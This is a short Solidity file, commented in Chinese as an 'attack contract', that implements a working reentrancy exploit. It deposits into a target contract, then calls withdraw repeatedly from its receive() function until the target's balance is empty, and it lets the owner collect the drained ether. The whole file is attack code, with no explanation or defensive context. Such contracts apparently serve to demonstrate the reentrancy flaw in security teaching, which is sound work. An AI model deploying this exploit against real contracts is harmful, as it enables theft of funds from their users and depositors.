// 攻击合约
pragma solidity ^0.8.0;

interface IVulnerableContract {
    function withdraw() external;
    function deposite() external payable;
}

contract ReentrancyAttack {
    IVulnerableContract public target;
    address public owner;

    constructor(address _target) {
        target = IVulnerableContract(_target);
        owner = msg.sender;
    }







    // 触发重入攻击
    function attack() external payable{
        require(msg.sender == owner, "Not the owner");
        target.deposite{value: msg.value}();
        target.withdraw();
    }

    // Fallback 函数 - 进行重入攻击
    receive() external payable {
        if (address(target).balance > 0 ) {
            target.withdraw(); // 递归调用
        }

    }

    // 取出攻击合约的资金
    function withdrawFunds() external {
        require(msg.sender == owner, "Not the owner");
        payable(owner).transfer(address(this).balance);
    }
}